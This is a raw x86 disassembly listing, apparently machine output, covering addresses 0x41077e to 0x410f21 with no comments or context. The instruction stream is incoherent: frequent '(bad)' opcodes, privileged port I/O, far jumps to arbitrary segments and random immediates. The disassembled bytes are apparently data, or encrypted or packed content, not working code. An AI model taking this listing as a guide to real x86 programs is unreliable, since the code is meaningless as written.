  41077e:	lock adc eax,eax
  410781:	pop    eax
  410782:	push   ss
  410783:	jne    0x4107f4
  410785:	loopne 0x410754
  410787:	mov    ds:0x9c0e0f82,al
  41078c:	cwde   
  41078d:	cmp    al,0x5
  41078f:	mov    ebx,0x8cec6220
  410794:	std    
  410795:	inc    ebx
  410796:	mov    dh,0xd7
  410798:	fnstsw WORD PTR [edx-0x69]
  41079b:	jae    0x410773
  41079d:	xor    eax,0xa8cf432d
  4107a2:	int3   
  4107a3:	popa   
  4107a4:	dec    edi
  4107a5:	imul   esi,esp,0xf5905ffe
  4107ab:	enter  0xbf6f,0xd4
  4107af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b0:	sub    edi,DWORD PTR [edx]
  4107b2:	add    eax,ebp
  4107b4:	outs   dx,DWORD PTR ds:[esi]
  4107b5:	pop    ebx
  4107b6:	stos   BYTE PTR es:[edi],al
  4107b7:	jns    0x410798
  4107b9:	fs dec edi
  4107bb:	call   0x3e5fe631
  4107c0:	sbb    al,0xd8
  4107c2:	ins    DWORD PTR es:[edi],dx
  4107c3:	in     eax,0x1f
  4107c5:	ja     0x41074e
  4107c7:	lods   al,BYTE PTR ds:[esi]
  4107c8:	xchg   ecx,eax
  4107c9:	jb     0x4107cb
  4107cb:	dec    ebp
  4107cc:	xor    dh,ah
  4107ce:	mov    dh,0x73
  4107d0:	scas   al,BYTE PTR es:[edi]
  4107d1:	outs   dx,DWORD PTR ds:[esi]
  4107d2:	xor    DWORD PTR [esi-0x7c05a5d6],ebp
  4107d8:	mov    esi,0x58e21f96
  4107dd:	inc    eax
  4107de:	push   0x42bee72d
  4107e3:	push   edx
  4107e4:	dec    eax
  4107e5:	retf   
  4107e6:	sbb    BYTE PTR [ebx+ecx*8],cl
  4107e9:	loop   0x41076d
  4107eb:	dec    ebp
  4107ec:	not    DWORD PTR [edi-0x41]
  4107ef:	pop    ebx
  4107f0:	jne    0x410823
  4107f2:	or     edx,eax
  4107f4:	fs sub eax,0xa898666d
  4107fa:	fnstsw WORD PTR [esi+0x42]
  4107fd:	fiadd  DWORD PTR [eax-0x4d]
  410800:	pop    edi
  410801:	in     eax,0xdf
  410803:	les    eax,FWORD PTR [ebx+0x68]
  410806:	adc    esi,0x38d68e34
  41080c:	push   cs
  41080d:	daa    
  41080e:	mov    bh,BYTE PTR [esi-0x6b]
  410811:	push   ebp
  410812:	mov    dl,0xd5
  410814:	cmp    BYTE PTR [ecx],cl
  410816:	jl     0x410847
  410818:	mov    ebp,0x4aad8552
  41081d:	aaa    
  41081e:	mov    ecx,0xbb0b7f41
  410823:	loope  0x41087e
  410825:	push   esp
  410826:	(bad)  
  410827:	mov    esp,0xa97d7ab0
  41082c:	pop    esp
  41082d:	outs   dx,BYTE PTR ds:[esi]
  41082e:	xor    ebp,ebx
  410830:	or     al,0xf
  410832:	adc    bl,bl
  410834:	add    eax,0xc4f502e3
  410839:	adc    al,0x7
  41083c:	sub    cl,BYTE PTR [ecx+0x37d65182]
  410842:	mov    cs,WORD PTR [ecx]
  410844:	pop    es
  410845:	jb     0x410891
  410847:	xor    bh,BYTE PTR [eax]
  410849:	sbb    al,bh
  41084b:	add    BYTE PTR [edi+eiz*1+0xe],ah
  41084f:	fld    TBYTE PTR [eax-0x74]
  410852:	sub    BYTE PTR [esi-0x7c],dl
  410855:	and    eax,0xa2d704f4
  41085a:	repnz lock cli 
  41085d:	aad    0x87
  41085f:	nop
  410860:	mov    edi,0xd4d99742
  410865:	add    al,0x51
  410867:	mov    DWORD PTR [ecx+0x16001ccd],ebx
  41086d:	jns    0x41082d
  41086f:	sbb    esi,DWORD PTR [eax-0x286f6cfc]
  410875:	gs in  eax,dx
  410877:	popa   
  410878:	in     eax,dx
  410879:	jnp    0x4108c5
  41087b:	jl     0x4108cf
  41087d:	or     al,0xf3
  41087f:	dec    ebx
  410880:	je     0x41088a
  410882:	adc    BYTE PTR [ebx+0x2d],cl
  410885:	shl    BYTE PTR [edx],cl
  410887:	mov    ch,cl
  410889:	xchg   ebx,eax
  41088a:	sub    eax,0x5dd5c89e
  41088f:	outs   dx,BYTE PTR ds:[esi]
  410890:	(bad)  
  410891:	fidiv  DWORD PTR cs:[ecx-0x79]
  410895:	xor    al,0xa3
  410897:	pop    ds
  410898:	mov    bl,0xa5
  41089a:	xchg   ecx,eax
  41089b:	into   
  41089c:	(bad)  
  41089d:	and    al,0x5c
  41089f:	adc    ebx,DWORD PTR [eax-0x10a38cfa]
  4108a5:	and    ch,ah
  4108a7:	add    al,0x64
  4108a9:	(bad)  
  4108aa:	fnstenv [esi+ebp*4-0x61]
  4108ae:	push   0xc4664dc3
  4108b3:	into   
  4108b4:	mov    ah,0xf7
  4108b6:	adc    ebx,DWORD PTR [edi-0x5b]
  4108b9:	jle    0x410893
  4108bb:	js     0x410937
  4108bd:	ds mov esp,es
  4108c0:	gs in  al,dx
  4108c2:	aam    0xc7
  4108c4:	f2xm1  
  4108c6:	inc    esi
  4108c7:	mov    eax,0x63611589
  4108cc:	xchg   esp,eax
  4108cd:	lods   eax,DWORD PTR ds:[esi]
  4108ce:	adc    eax,0x663e477a
  4108d3:	mov    bl,0x5e
  4108d5:	stc    
  4108d6:	adc    BYTE PTR [eax],bl
  4108d8:	daa    
  4108d9:	addr16 mov edx,0x4ce6d95d
  4108df:	push   ebp
  4108e0:	rcr    ah,0x45
  4108e3:	adc    BYTE PTR [edx-0x1cf6e360],bh
  4108e9:	inc    eax
  4108ea:	mov    BYTE PTR [ebp+ebp*2-0x74c1c303],dh
  4108f1:	jl     0x410877
  4108f3:	sbb    DWORD PTR ds:0x4479666c,ecx
  4108f9:	jno    0x4108cd
  4108fb:	ins    BYTE PTR es:[edi],dx
  4108fc:	sbb    al,0x4b
  4108fe:	jge    0x4108f2
  410900:	mov    edi,0x88a5f1c4
  410905:	cwde   
  410906:	ret    0xaa87
  410909:	pushf  
  41090a:	neg    BYTE PTR [ebx-0x33]
  41090d:	mov    dh,0x21
  41090f:	or     al,0x17
  410911:	jl     0x410932
  410913:	loop   0x410967
  410915:	push   es
  410916:	nop
  410917:	out    dx,eax
  410918:	or     eax,0xe2287aa5
  41091d:	imul   edx,DWORD PTR [esi],0x798913a2
  410923:	nop
  410924:	xor    eax,DWORD PTR [ecx]
  410926:	mov    edx,0xd47ee042
  41092b:	sbb    BYTE PTR [si-0x7083],dl
  410930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410931:	cmp    al,BYTE PTR [edx]
  410933:	ds pop ds
  410935:	retf   
  410936:	shr    BYTE PTR [edx],1
  410938:	and    BYTE PTR [ebx+0x68],0x73
  41093c:	sti    
  41093d:	push   edx
  41093e:	push   0xffffffb5
  410940:	xchg   esi,eax
  410941:	mov    dl,0x45
  410943:	fadd   st(7),st
  410945:	lea    eax,[eax+0xd]
  410948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410949:	push   edx
  41094a:	jmp    0x449c:0xf792a24d
  410951:	clc    
  410952:	sbb    esi,eax
  410954:	mov    dl,0x47
  410956:	cmp    DWORD PTR [esi+0x71efad16],ebp
  41095c:	push   esp
  41095d:	push   es
  41095e:	mov    ebx,0x580a5e99
  410963:	and    al,0x88
  410965:	popf   
  410966:	sbb    eax,0x8e790316
  41096b:	pop    edi
  41096c:	add    al,0xf0
  41096e:	int3   
  41096f:	cmp    DWORD PTR [ecx],0xffffffee
  410972:	push   ebp
  410973:	mov    bl,0xfe
  410975:	mov    dh,0x6d
  410977:	mov    ebx,ecx
  410979:	add    eax,0x883310cf
  41097e:	cmp    ch,BYTE PTR [esi+0x5e]
  410981:	loope  0x4109d8
  410983:	cmc    
  410984:	cmp    BYTE PTR [eax+0x647871ac],al
  41098a:	dec    ecx
  41098b:	xchg   edx,eax
  41098c:	jno    0x4109b7
  41098e:	jl     0x41091d
  410990:	scas   al,BYTE PTR es:[edi]
  410991:	stos   DWORD PTR es:[edi],eax
  410992:	and    esi,DWORD PTR [ebx+eax*1+0x4c]
  410996:	fcomp  DWORD PTR [eax-0x37]
  410999:	je     0x4109a2
  41099b:	xor    al,0xb7
  41099d:	dec    edx
  41099e:	in     al,0x36
  4109a0:	cmp    eax,0xc016ad00
  4109a5:	aad    0x96
  4109a7:	push   eax
  4109a8:	loopne 0x4109bc
  4109aa:	(bad)  
  4109ab:	js     0x410a0b
  4109ad:	adc    esi,DWORD PTR [ecx+0x14]
  4109b0:	mul    ch
  4109b2:	sub    al,0xce
  4109b4:	loopne 0x410a20
  4109b6:	iret   
  4109b7:	add    esi,DWORD PTR [ecx]
  4109b9:	scas   eax,DWORD PTR es:[edi]
  4109ba:	dec    esp
  4109bb:	mov    esp,edx
  4109bd:	aas    
  4109be:	fst    QWORD PTR [edi]
  4109c0:	jb     0x410a1c
  4109c2:	out    0x33,al
  4109c4:	ds cdq 
  4109c6:	in     eax,0xd8
  4109c8:	pop    eax
  4109c9:	stos   DWORD PTR es:[edi],eax
  4109ca:	fist   DWORD PTR [edx+0xc]
  4109cd:	inc    ecx
  4109ce:	sub    ebp,DWORD PTR [edi+0xaa5fb6f]
  4109d4:	bound  ebp,QWORD PTR [edx-0x626d64db]
  4109da:	cmp    ecx,DWORD PTR [ebp-0x4f]
  4109dd:	pusha  
  4109de:	test   DWORD PTR [edx],ecx
  4109e0:	icebp  
  4109e1:	push   cs
  4109e2:	mov    eax,DWORD PTR [ebx+0x32]
  4109e5:	(bad)  
  4109e6:	inc    esi
  4109e7:	push   cs
  4109e8:	in     eax,0x63
  4109ea:	rol    ecx,cl
  4109ec:	mov    ecx,0x508f8f39
  4109f1:	ret    0x3c81
  4109f4:	rol    DWORD PTR [esi-0x4524fc9f],0xbc
  4109fb:	js     0x4109fb
  4109fd:	into   
  4109fe:	xlat   BYTE PTR ds:[ebx]
  4109ff:	jnp    0x410a19
  410a01:	pop    edx
  410a02:	aad    0x99
  410a04:	sbb    DWORD PTR [edi+0x46ff2198],0x48
  410a0b:	mov    eax,ds:0x4dd55e90
  410a10:	xor    eax,edx
  410a12:	push   es
  410a13:	push   ecx
  410a14:	pop    ebx
  410a15:	inc    ecx
  410a16:	mov    ch,0x47
  410a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a19:	jecxz  0x4109b1
  410a1b:	inc    eax
  410a1c:	outs   dx,DWORD PTR ds:[esi]
  410a1d:	pop    edx
  410a1e:	ins    BYTE PTR es:[edi],dx
  410a1f:	jecxz  0x4109e8
  410a21:	ss fwait
  410a23:	pop    eax
  410a24:	(bad)  
  410a25:	push   ds
  410a26:	xchg   esi,eax
  410a27:	sub    al,0x8b
  410a29:	addr16 xchg esp,eax
  410a2b:	pusha  
  410a2c:	cdq    
  410a2d:	(bad)  
  410a2e:	jmp    0x410a77
  410a30:	fld    QWORD PTR [ecx+0x3f]
  410a33:	loope  0x410a00
  410a35:	(bad)  
  410a36:	cli    
  410a37:	lods   al,BYTE PTR ds:[esi]
  410a38:	xchg   ebx,eax
  410a39:	scas   eax,DWORD PTR es:[edi]
  410a3a:	and    al,0xc8
  410a3c:	and    eax,0x851a2ccf
  410a41:	xchg   ecx,eax
  410a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a43:	ss fcomi st,st(3)
  410a46:	je     0x410abe
  410a48:	adc    ebx,DWORD PTR [eax-0x5b4deb9c]
  410a4e:	cmp    esi,0xfffffff9
  410a51:	pop    DWORD PTR [esi-0xa91de01]
  410a57:	sub    DWORD PTR [edi+esi*4+0x7],eax
  410a5b:	fst    QWORD PTR [ebx+0x7233f332]
  410a61:	imul   esp,DWORD PTR [eax+esi*8+0x321899dd],0xfffffffd
  410a69:	sub    dh,BYTE PTR [edi+0x64]
  410a6c:	shr    esi,0xb4
  410a6f:	enter  0x3961,0xf4
  410a73:	arpl   WORD PTR [eax-0x3d],ax
  410a76:	int    0xd2
  410a78:	dec    ebp
  410a79:	dec    esp
  410a7a:	cmp    BYTE PTR [edi-0x455add65],0xd5
  410a81:	repz dec eax
  410a83:	or     al,0x2f
  410a85:	(bad)  
  410a86:	in     eax,0xe5
  410a88:	xchg   ebp,eax
  410a89:	jge    0x410ab3
  410a8b:	fidivr DWORD PTR [ebx]
  410a8d:	mov    ds,WORD PTR [ebp+0x4d0297cc]
  410a93:	mov    al,0x13
  410a95:	xchg   esi,eax
  410a96:	scas   al,BYTE PTR es:[edi]
  410a97:	out    0x88,eax
  410a99:	dec    edx
  410a9a:	mov    dh,0x6f
  410a9c:	xchg   edx,eax
  410a9d:	addr16 pop esp
  410a9f:	xor    BYTE PTR [eax-0x6c],ch
  410aa2:	fcom   st(1)
  410aa4:	add    BYTE PTR [ecx+ebp*1-0x54fdebd6],0x2e
  410aac:	in     al,dx
  410aad:	cmp    BYTE PTR [eax-0x2b],ah
  410ab0:	ret    
  410ab1:	retf   0x102d
  410ab4:	sbb    DWORD PTR [ebx],ecx
  410ab6:	and    ah,BYTE PTR [edx+0x65]
  410ab9:	inc    ebx
  410aba:	jmp    0xecba:0x13f7d724
  410ac1:	aaa    
  410ac2:	xor    ecx,ebp
  410ac4:	cmp    ebx,DWORD PTR [eax+0x320c6ad0]
  410aca:	leave  
  410acb:	sub    ecx,ebp
  410acd:	bound  eax,QWORD PTR [esi]
  410acf:	or     esp,esi
  410ad1:	sbb    esp,DWORD PTR [edx]
  410ad3:	fimul  DWORD PTR [ebx]
  410ad5:	inc    ecx
  410ad6:	mov    ecx,0x4cdca772
  410adb:	push   ebp
  410adc:	xlat   BYTE PTR ds:[bx]
  410ade:	or     eax,DWORD PTR [edx+0x5411a276]
  410ae4:	dec    ecx
  410ae5:	or     dl,ah
  410ae7:	push   eax
  410ae8:	sbb    bl,dl
  410aea:	div    BYTE PTR [edx+0x5]
  410aed:	cwde   
  410aee:	cmp    cl,BYTE PTR [edx*4-0x15ccf3dc]
  410af5:	push   ecx
  410af6:	add    al,0xc5
  410af8:	fmul   DWORD PTR [edx-0x33]
  410afb:	adc    edx,edi
  410afd:	add    cl,dl
  410aff:	nop
  410b00:	xor    al,0x56
  410b02:	jae    0x410b53
  410b04:	icebp  
  410b05:	push   ecx
  410b06:	push   esp
  410b07:	sar    ch,0xcf
  410b0a:	and    eax,0x640c66
  410b0f:	xor    BYTE PTR [esp+edi*1+0x65a4e484],ah
  410b16:	sub    eax,0x46bd1cae
  410b1b:	cwde   
  410b1c:	mov    ds:0x378cafd4,al
  410b21:	jmp    ebp
  410b23:	mov    gs,edi
  410b25:	and    BYTE PTR ds:0x1e28329e,dl
  410b2b:	and    BYTE PTR [esi-0x71bb918b],cl
  410b31:	fld    DWORD PTR [eax]
  410b33:	and    esi,ecx
  410b35:	cli    
  410b36:	mov    DWORD PTR [ebp+0x29],0xc3846710
  410b3d:	call   0xf1d79c9
  410b42:	inc    eax
  410b43:	jecxz  0x410b33
  410b45:	loope  0x410b21
  410b47:	cwde   
  410b48:	push   esp
  410b49:	pop    ds
  410b4a:	aas    
  410b4b:	jb     0x410acd
  410b4d:	dec    ebx
  410b4e:	sahf   
  410b4f:	hlt    
  410b50:	stc    
  410b51:	xchg   ebp,eax
  410b52:	inc    ebx
  410b53:	mov    dl,0x5f
  410b55:	jns    0x410bb2
  410b57:	inc    ebp
  410b58:	mov    edx,0xaf9758da
  410b5d:	es mov eax,0xa90cef3a
  410b63:	inc    ebx
  410b64:	push   esp
  410b65:	pop    esp
  410b66:	xchg   ecx,eax
  410b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b68:	inc    ebx
  410b69:	in     al,0x1b
  410b6b:	aaa    
  410b6c:	xor    BYTE PTR [esi+0xd21a673],ah
  410b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b73:	mov    ch,0x3d
  410b75:	popa   
  410b76:	sbb    BYTE PTR [ebx+0x71f6713c],ch
  410b7c:	xor    si,cx
  410b7f:	and    BYTE PTR ss:[ecx+0x63306e97],0xcf
  410b87:	daa    
  410b88:	ins    DWORD PTR es:[edi],dx
  410b89:	and    DWORD PTR [edx+0x72111716],ecx
  410b8f:	inc    edx
  410b90:	out    dx,eax
  410b91:	mov    ds:0x3e0928e,eax
  410b96:	and    dh,ch
  410b98:	jno    0x410b92
  410b9a:	ror    DWORD PTR [eax+0x31],0xd9
  410b9e:	(bad)  
  410b9f:	jmp    0xe21e:0xa7bcdb72
  410ba6:	shl    DWORD PTR [esi],1
  410ba8:	cmp    al,0x9f
  410baa:	sbb    al,0x26
  410bac:	mov    esi,es
  410bae:	retf   
  410baf:	test   DWORD PTR [ebx],ecx
  410bb1:	test   eax,0x98bcd43b
  410bb6:	clc    
  410bb7:	sbb    al,0xf4
  410bb9:	dec    ecx
  410bba:	enter  0xe7a3,0xc9
  410bbe:	mov    ebx,0x574815e5
  410bc3:	fadd   st,st(3)
  410bc5:	outs   dx,DWORD PTR ds:[esi]
  410bc6:	mov    bh,0x39
  410bc8:	jecxz  0x410c0a
  410bca:	xchg   esi,eax
  410bcb:	or     edx,DWORD PTR [ebp+0x52]
  410bce:	mov    ah,0xb5
  410bd0:	adc    DWORD PTR [eax-0x60],eax
  410bd3:	mov    dl,0x45
  410bd5:	fwait
  410bd6:	les    eax,FWORD PTR [esi-0x48058d04]
  410bdc:	add    BYTE PTR [ecx],ah
  410bde:	xor    al,0x8
  410be0:	jl     0x410bbd
  410be2:	xchg   al,bl
  410be4:	pop    esp
  410be5:	mov    al,0x91
  410be7:	cmp    eax,0x5c6d73ae
  410bec:	xor    eax,0x34cfd5d5
  410bf1:	sub    eax,0x232530ee
  410bf6:	daa    
  410bf7:	fdivrp st(5),st
  410bf9:	cld    
  410bfa:	test   al,0x94
  410bfc:	push   es
  410bfd:	in     eax,0x53
  410bff:	and    bl,BYTE PTR [ebx-0x57]
  410c02:	inc    edx
  410c03:	mov    ebp,0xd79da3aa
  410c08:	mov    ds:0x4bf1e90e,al
  410c0d:	push   ds
  410c0e:	pop    edi
  410c0f:	push   ss
  410c10:	mov    ds:0xf19ad51,al
  410c15:	test   BYTE PTR [ecx+0x20],ch
  410c18:	rcr    DWORD PTR [esi+0x34],0xf4
  410c1c:	sub    al,0x32
  410c1e:	sar    ch,1
  410c20:	addr16 cmp dl,ch
  410c23:	push   es
  410c24:	sub    BYTE PTR [ecx+eiz*4+0x1581c412],0x1a
  410c2c:	push   ss
  410c2d:	xor    BYTE PTR [edi],ch
  410c2f:	imul   ebx,DWORD PTR [eax-0x66e4b556],0x1b792bbc
  410c39:	out    0xb7,al
  410c3b:	xchg   ah,bh
  410c3d:	add    BYTE PTR [ecx+0x6c],bl
  410c40:	jp     0x410c17
  410c42:	jne    0x410c48
  410c44:	xor    esp,DWORD PTR [eax]
  410c46:	in     al,dx
  410c47:	pop    edx
  410c48:	loop   0x410bd8
  410c4a:	xor    eax,0xc8335e66
  410c4f:	in     eax,dx
  410c50:	lock sub cl,BYTE PTR [eax]
  410c53:	mov    bh,BYTE PTR fs:[edi-0x7d]
  410c57:	loop   0x410cd1
  410c59:	nop
  410c5a:	adc    eax,0x41d5eea7
  410c5f:	cmc    
  410c60:	clc    
  410c61:	cmp    DWORD PTR [edx],esi
  410c63:	and    eax,0xf387e6ab
  410c68:	aas    
  410c69:	inc    esi
  410c6a:	aad    0xe
  410c6c:	shl    BYTE PTR [esi-0x18],cl
  410c6f:	shl    bl,1
  410c71:	dec    edx
  410c72:	push   0xffffffb4
  410c74:	pop    ecx
  410c75:	imul   ebp,DWORD PTR [ebx],0xc237f5a5
  410c7b:	nop
  410c7c:	push   es
  410c7d:	cwde   
  410c7e:	icebp  
  410c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c80:	test   DWORD PTR [edi],eax
  410c82:	dec    esp
  410c83:	push   ss
  410c84:	sub    edi,DWORD PTR [esi+0x4ab1f1ee]
  410c8a:	clc    
  410c8b:	bound  eax,QWORD PTR [ecx]
  410c8d:	push   0x15f3d983
  410c92:	outs   dx,DWORD PTR ds:[esi]
  410c93:	xor    al,0xb1
  410c95:	mov    edi,0x1247f30f
  410c9a:	jne    0x410c95
  410c9c:	push   esi
  410c9d:	loope  0x410c31
  410c9f:	iret   
  410ca0:	repz aas 
  410ca2:	mov    ebp,0x3c4ff554
  410ca7:	retf   
  410ca8:	mov    bl,0x3d
  410caa:	jecxz  0x410c64
  410cac:	je     0x410cc2
  410cae:	jge    0x410c62
  410cb0:	aas    
  410cb1:	loopne 0x410d15
  410cb3:	push   ebp
  410cb4:	xor    al,0x34
  410cb6:	pop    esi
  410cb7:	mov    gs,WORD PTR [esi-0x3]
  410cba:	ja     0x410cd8
  410cbc:	jl     0x410d00
  410cbe:	mov    edx,0x5a08fc7d
  410cc3:	stc    
  410cc4:	ss add al,0xf
  410cc7:	jmp    0x410cbc
  410cc9:	xor    al,0x90
  410ccb:	loop   0x410c72
  410ccd:	mov    esp,0x726fed88
  410cd2:	arpl   WORD PTR [edx-0x78e4b5dd],bx
  410cd8:	sbb    BYTE PTR [eax+0x73057956],dl
  410cde:	sbb    dl,cl
  410ce0:	push   ds
  410ce1:	and    ch,BYTE PTR [ebx+0x34]
  410ce4:	xchg   edi,eax
  410ce5:	sbb    BYTE PTR [ecx],al
  410ce7:	hlt    
  410ce8:	jb     0x410d5d
  410cea:	call   DWORD PTR es:[eax+0x73]
  410cee:	sub    eax,0x6124124f
  410cf3:	and    bh,bh
  410cf5:	dec    ebx
  410cf6:	xor    al,0x78
  410cf8:	in     al,0x27
  410cfa:	xor    al,0xd6
  410cfc:	mov    ds:0x181b9afc,eax
  410d01:	cdq    
  410d02:	inc    esi
  410d03:	add    ah,BYTE PTR [esi-0x46]
  410d06:	push   ebx
  410d07:	(bad)  
  410d08:	leave  
  410d09:	ret    0xed6f
  410d0c:	pop    ebx
  410d0d:	outs   dx,DWORD PTR ds:[esi]
  410d0e:	sub    dh,BYTE PTR [ecx]
  410d10:	mov    esi,DWORD PTR [esi+0x48157617]
  410d16:	in     al,dx
  410d17:	repnz add esp,DWORD PTR [edx]
  410d1a:	std    
  410d1b:	adc    esi,DWORD PTR [edi]
  410d1d:	mov    al,BYTE PTR [ebx]
  410d1f:	inc    eax
  410d20:	mov    cl,0x93
  410d22:	(bad)  
  410d23:	dec    ebp
  410d24:	sbb    DWORD PTR [edi+0x32],esp
  410d27:	das    
  410d28:	sub    BYTE PTR [esi-0x6bcce3dd],dl
  410d2e:	jl     0x410d3b
  410d30:	xchg   ebx,eax
  410d31:	mov    ebx,0xe0a726f6
  410d36:	mov    DWORD PTR [ebp+edi*8-0x556a7ba1],edi
  410d3d:	adc    esi,eax
  410d3f:	xchg   ecx,eax
  410d40:	jecxz  0x410d25
  410d42:	mov    ebx,0x8dc19a67
  410d47:	mov    dl,0x10
  410d49:	inc    edx
  410d4a:	or     al,0xe7
  410d4c:	lods   al,BYTE PTR ds:[esi]
  410d4d:	adc    ebx,DWORD PTR [edi]
  410d4f:	out    0x35,al
  410d51:	xor    edx,esi
  410d53:	pop    edx
  410d54:	dec    ebx
  410d55:	scas   eax,DWORD PTR es:[edi]
  410d56:	cdq    
  410d57:	pop    ebx
  410d58:	scas   eax,DWORD PTR es:[edi]
  410d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d5a:	fst    st(2)
  410d5c:	adc    al,0x84
  410d5e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410d60:	dec    ebx
  410d61:	dec    esi
  410d62:	cwde   
  410d63:	or     eax,0x7f344f0d
  410d68:	bnd jmp 0x410de3
  410d6b:	mov    dl,BYTE PTR [edi-0x4fbc4595]
  410d71:	mov    BYTE PTR [edx-0x79],bh
  410d74:	dec    eax
  410d75:	ror    DWORD PTR [esi-0x5e53cca2],0xc7
  410d7c:	sbb    eax,0x86cca5ab
  410d81:	icebp  
  410d82:	shr    BYTE PTR [eax+0x6],0x2b
  410d86:	call   0x4261e961
  410d8b:	mov    ds:0xce04334,al
  410d90:	fisub  WORD PTR [esi+esi*1-0x3b481d6e]
  410d97:	lock call 0xcbf5:0xcea14c
  410d9f:	out    0x2d,al
  410da1:	fmul   DWORD PTR [ecx+0x56ffca6f]
  410da7:	hlt    
  410da8:	push   edx
  410da9:	mov    esi,0x96335b8f
  410dae:	push   eax
  410daf:	and    esi,DWORD PTR [esp+esi*8]
  410db2:	add    DWORD PTR [edi+0x9ce3bb1],0xffffffe6
  410db9:	std    
  410dba:	add    DWORD PTR [esi],edx
  410dbc:	(bad)  
  410dbd:	mov    ecx,0xc6c84660
  410dc2:	aas    
  410dc3:	aad    0x5f
  410dc5:	sub    BYTE PTR [ebx-0x4d],0xda
  410dc9:	xchg   edi,eax
  410dca:	xchg   edi,eax
  410dcb:	pusha  
  410dcc:	inc    edi
  410dcd:	je     0x410db0
  410dcf:	stos   BYTE PTR es:[edi],al
  410dd0:	pop    esi
  410dd1:	mov    DWORD PTR [esi],edi
  410dd3:	ss pop ebx
  410dd5:	aam    0xd2
  410dd7:	xor    eax,0x812300fa
  410ddc:	aaa    
  410ddd:	mov    bl,BYTE PTR [ebx]
  410ddf:	out    0x12,al
  410de1:	repz retf 
  410de3:	fwait
  410de4:	sub    ebx,edx
  410de6:	mov    al,0x7a
  410de8:	pop    ds
  410de9:	into   
  410dea:	shr    BYTE PTR [ecx+edi*1-0x55],0x3
  410def:	shl    DWORD PTR [ebx+0x10cd3cf8],0x9f
  410df6:	jmp    0x6f6ad480
  410dfb:	jne    0x410dea
  410dfd:	xchg   esp,eax
  410dfe:	add    BYTE PTR [ecx+0x60d46b49],ah
  410e04:	daa    
  410e05:	fisub  WORD PTR [edi-0x50]
  410e08:	add    esp,DWORD PTR ds:0xe8532bf6
  410e0e:	xor    bl,BYTE PTR ds:0x236d5c7b
  410e14:	mov    esp,edx
  410e16:	lock mov WORD PTR [edx-0xfc1319e],?
  410e1d:	sub    ebp,DWORD PTR [edx-0x30d50063]
  410e23:	cmp    bh,BYTE PTR [edx]
  410e25:	xor    al,BYTE PTR [esi+eiz*2+0x40]
  410e29:	inc    ebp
  410e2a:	out    dx,eax
  410e2b:	stos   DWORD PTR es:[edi],eax
  410e2c:	pop    esi
  410e2d:	movzx  ecx,ax
  410e30:	adc    BYTE PTR [esi],cl
  410e32:	jmp    0x410e46
  410e34:	xchg   edi,eax
  410e35:	iret   
  410e36:	xchg   edi,eax
  410e37:	call   0x4497:0xf1b31ca7
  410e3e:	xor    ah,ah
  410e40:	jmp    0x410ea9
  410e42:	sbb    esi,DWORD PTR [edx-0x72a07824]
  410e48:	repz (bad) 
  410e4a:	cmp    eax,0xc361c50b
  410e4f:	dec    edi
  410e50:	cmp    BYTE PTR [eax],al
  410e52:	pop    eax
  410e53:	xlat   BYTE PTR ds:[ebx]
  410e54:	(bad)  
  410e55:	sbb    al,bh
  410e57:	and    ch,cl
  410e59:	mov    cl,0x59
  410e5b:	mov    ah,0x5d
  410e5d:	push   ss
  410e5e:	adc    cl,BYTE PTR [edi+eax*8]
  410e61:	leave  
  410e62:	shr    DWORD PTR [esi-0x365f96f2],1
  410e68:	or     dl,dh
  410e6a:	or     bh,bh
  410e6c:	into   
  410e6d:	mov    cs,WORD PTR [esi-0x5e]
  410e70:	add    eax,0x8970afa3
  410e75:	jne    0x410e9c
  410e77:	arpl   WORD PTR [ecx+esi*4-0x76],si
  410e7b:	aaa    
  410e7c:	int3   
  410e7d:	and    BYTE PTR [ebp+0x448fb792],dh
  410e83:	popa   
  410e84:	call   0x943a:0x24579edf
  410e8b:	xor    edi,DWORD PTR ds:0x6eca7ac6
  410e91:	sub    BYTE PTR [ecx+0x4e],bl
  410e94:	js     0x410edc
  410e96:	mov    edx,0x1952e399
  410e9b:	jecxz  0x410f11
  410e9d:	xchg   ebp,eax
  410e9e:	sbb    DWORD PTR [ebx-0x1a56e50],eax
  410ea4:	int    0xd5
  410ea6:	push   ds
  410ea7:	sub    bl,dl
  410ea9:	or     DWORD PTR [edi+0x6d],0xffffff90
  410ead:	push   esp
  410eae:	and    al,0xf7
  410eb0:	dec    esi
  410eb1:	lea    esp,[ebp+0x151a7856]
  410eb7:	mov    cl,0x86
  410eb9:	jp     0x410f0d
  410ebb:	xor    bl,BYTE PTR [ecx-0x6b]
  410ebe:	pop    eax
  410ebf:	enter  0xc75a,0x49
  410ec3:	retf   
  410ec4:	in     eax,dx
  410ec5:	ins    DWORD PTR es:[edi],dx
  410ec6:	adc    eax,0xd3f67d9b
  410ecb:	adc    al,0x4f
  410ecd:	push   es
  410ece:	pop    ebx
  410ecf:	imul   eax,ebp,0xffffff9f
  410ed2:	retf   0xb54b
  410ed5:	push   esi
  410ed6:	mov    cl,BYTE PTR [ecx+esi*4+0x59e51319]
  410edd:	xor    eax,0xcfd1268b
  410ee2:	xchg   BYTE PTR [ebx+0x7b],ah
  410ee5:	lods   eax,DWORD PTR ds:[esi]
  410ee6:	sbb    al,0x4b
  410ee8:	or     eax,0xb43c1b8c
  410eed:	inc    edi
  410eee:	adc    DWORD PTR [esi+0x65],ebx
  410ef1:	sub    DWORD PTR [ecx+0x751083b6],esp
  410ef7:	shl    DWORD PTR [edx-0x218f5d89],cl
  410efd:	sub    BYTE PTR [edx+esi*2-0x8],dh
  410f01:	push   es
  410f02:	(bad)  
  410f03:	jo     0x410e8c
  410f05:	mov    WORD PTR [edx],fs
  410f07:	xchg   ecx,eax
  410f08:	stos   DWORD PTR es:[edi],eax
  410f09:	popa   
  410f0a:	add    cl,BYTE PTR [ebp+0xdb6abe2]
  410f10:	add    BYTE PTR [esi+eax*8-0x6edf73bf],bl
  410f17:	xor    bh,BYTE PTR [ebx-0x6]
  410f1a:	dec    esi
  410f1b:	arpl   WORD PTR ds:0x2d239183,sp
  410f21:	jne    0x410f2c
